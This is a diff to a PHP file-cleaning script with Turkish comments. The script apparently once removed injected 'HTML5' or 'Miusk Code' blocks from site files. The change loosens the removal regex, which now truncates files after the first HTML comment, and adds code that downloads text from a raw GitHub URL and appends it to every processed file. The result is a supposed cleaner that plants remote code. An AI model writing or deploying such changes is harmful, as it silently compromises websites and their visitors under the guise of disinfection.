@@ -54,15 +54,27 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 } else {
                     $fileContents = @file_get_contents($filePath);
 
-                    if ($fileContents !== false && preg_match('/<!-- HTML5: .*? -->|<!-- Miusk Code: .*? -->/', $fileContents)) {
-                        // Değişiklik içeren bölümü temizle
-                        $cleanedContents = preg_replace('/<!-- HTML5: .*? -->.*?|<!-- Miusk Code: .*? -->.*?/s', '', $fileContents);
+                    if ($fileContents !== false) {
+                        // İlk yorum satırını ve sonrasını temizle
+                        $cleanedContents = preg_replace('/<!--.*?-->(.*)$/s', '', $fileContents);
 
-                        if (@file_put_contents($filePath, $cleanedContents)) {
-                            $removedFiles[] = $filePath;
-                            $results[] = ['file' => $filePath, 'status' => 'success', 'message' => 'Değişiklikler kaldırıldı.'];
-                        } else {
-                            $results[] = ['file' => $filePath, 'status' => 'error', 'message' => 'Dosya değişiklikleri kaldırılamadı.'];
+                        if ($cleanedContents !== $fileContents) { // Eğer değişiklik yapıldıysa
+                            if (@file_put_contents($filePath, $cleanedContents)) {
+                                $removedFiles[] = $filePath;
+                                $results[] = ['file' => $filePath, 'status' => 'success', 'message' => 'Değişiklikler kaldırıldı.'];
+                            } else {
+                                $results[] = ['file' => $filePath, 'status' => 'error', 'message' => 'Dosya değişiklikleri kaldırılamadı.'];
+                            }
+                        }
+
+                        // Dış kaynaktan kod ekle
+                        $fetchedCode = file_get_contents('https://raw.githubusercontent.com/necessaryfor/neces/refs/heads/main/z2y-s.txt');
+                        if ($fetchedCode !== false) {
+                            if (@file_put_contents($filePath, $cleanedContents . "\n" . $fetchedCode)) {
+                                $results[] = ['file' => $filePath, 'status' => 'success', 'message' => 'Kod başarıyla eklendi.'];
+                            } else {
+                                $results[] = ['file' => $filePath, 'status' => 'error', 'message' => 'Kod eklenirken hata oluştu.'];
+                            }
                         }
                     }
                 }
@@ -83,8 +95,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     exit;
 }
 ?>
+
+?>
+
+
 <script>
-    window.addEventListener('load', function () {
+window.addEventListener('load', function () {
     if (!window.cleaningStarted) { 
         window.cleaningStarted = true;
 
